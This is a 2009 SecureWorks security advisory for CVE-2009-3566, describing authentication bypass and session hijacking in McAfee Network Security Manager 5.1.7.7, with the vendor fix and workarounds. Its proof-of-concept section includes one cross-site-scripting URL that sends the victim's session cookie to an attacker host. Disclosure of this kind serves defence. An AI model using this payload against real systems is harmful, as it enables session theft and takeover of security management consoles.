    "text": "title : McAfee Network Security Manager Bypass / Hijack  ， detail : The McAfee Network Security Manager suffers from authentication bypass and session hijacking vulnerabilities.  ， cve : advisories | CVE-2009-3566  ，  ， desc : -BEGIN PGP SIGNED MESSAGE-  ， Hash : SHA256  ， SecureWorks Security Advisory SWRX-2009-002  ， McAfee Network Security Manager Authentication Bypass and Session Hijacking Vulnerability  ， Advisory Information  ， Title : McAfee Network Security Manager Authentication Bypass and Session Hijacking Vulnerability  ， Advisory ID : SWRX-2009-002  ， Advisory URL : http : /www.secureworks.com/ctu/advisories/SWRX-2009-002  ， Date published : Wednesday , November 11 , 2009  ， CVE : CVE-2009-3566  ， CVSS v2 Base Score : 4.3 ( Medium )  ( AV : N/AC : M/Au : N/C : P/I : N/A : N )   ， Date of last update : Wednesday , November 11 , 2009  ， Vendors contacted : McAfee , Inc.  ， Release mode : Coordinated release  ， Discovered by : Daniel King , SecureWorks  ， Summary  ， McAfee Network Security Manager is vulnerable to authentication bypass via HTTP session cookie hijacking. A remote attacker could exploit this vulnerability to hijack an existing session to the Network Security Manager.  ， Affected Products  ， McAfee Network Security Manager ( NSM )  , version 5.1.7.7 ( default configuration ) .  ， It is unknown which other versions , if any , are affected as of November 11 , 2009.  ， Vendor Information , Solutions and Workarounds  ， McAfee has provided a new release to address this security flaw. Upgrade NSM software to NSM 5.1.11.8.1 or above , available for McAfee NSM clients at :   ， https : /secure.nai.com/apps/downloads/my_products/login.asp  ， More information is available from McAfee at :   ， McAfee Security Bulletin SB10005  ， Intrushield NSM update fixes Session Hijacking flaw  ， https : /kc.mcafee.com/corporate/index?page=content&id=SB10005  ， Follow best practices of placing the security management console on a segregated management network. Apply restrictive , default-deny firewall policies to protect these assets from access by unauthorized users.  ， Do not perform administrative access of security management consoles from computers exposed to the Internet through web browsing , email , and other applications. Lock down and heavily monitor systems used to perform administrative tasks such as accessing security management consoles.  ， Details  ， When a user loads the login page of the Network Security Manager , the server sets a cookie within the browser before authentication occurs. This cookie is accessible from client-side JavaScript because the HttpOnly flag is not set. An attacker with access to this cookie may gain privileged access to the Network Security Manager without the need to authenticate.  ， SecureWorks Risk Scoring  ， Likelihood : 2 Best practice is to deploy the management console web application on a segmented management network.  ， Impact : 5 Control over security appliances managed by the management console.  ， CVSS Severity ( version 2.0 )   ， Access Vector : Network exploitable ; Victim must voluntarily interact with attack mechanism  ， Access Complexity : Medium  ， Authentication : Not required to exploit  ， Impact Type : Allows unauthorized modification  ， Confidentiality Impact : Partial  ， Integrity Impact : None  ， Availability Impact : None  ， Impact Subscore : 2.9  ， Exploitability Subscore : 8.6  ， CVSS v2 Base Score : 4.3 ( Medium )  ( AV : N/AC : M/Au : N/C : P/I : N/A : N )   ， Proof of Concept  ， The following demonstrates theft of the session identifier. A cross-site scripting vulnerability is leveraged to steal the cookie data.  ， Example URL used in cookie theft :   ， https : /x.x.x.x/intruvert/jsp/module/Login.jsp?password=&Login%2bID=&node=&iaction=precreatefcb14%22%3E%3Cscript%3Enew%20Image (  ) .src=%22http : /x.x.x.x/mcafee/log.cgi?c=%22%2BencodeURI ( document.cookie )  ; %3C/script%3E8b3283a1e57  ， Because the HttpOnly flag is not set on the cookie , the cookie data is available from client-side JavaScript. The URL above injects a JavaScript image object within an XSS attack. The src method is then invoked on the Image object , and the URL passed to the object contains a URI-encoded version of the cookie data.  ， This will cause the victims browser to connect to the URL and attempt to fetch this image. Since the image does not exist , nothing will display on the victims browser. The attackers web server access logs will contain the victims cookie data , including the session identifier.  ， Using the victims session identifier , the attacker can send a specially-crafted HTTP request to the server that will result in an authentication bypass.  ， Revision History  ， 1.0 November 11 , 2009 Initial advisory release  ， PGP Keys  ， This advisory has been signed with the PGP key of the SecureWorks Counter Threat Unit ( SM )  , which is available for download at http : /www.secureworks.com/contact/SecureWorksCTU.asc.  ， About the SecureWorks Counter Threat Unit ( SM )   ， Our expert team of threat researchers , also known as the SecureWorks Counter Threat Unit ( SM )  , identifies and analyzes emerging threats and develops countermeasures , correlations and SOC processes to protect clients' critical information assets.
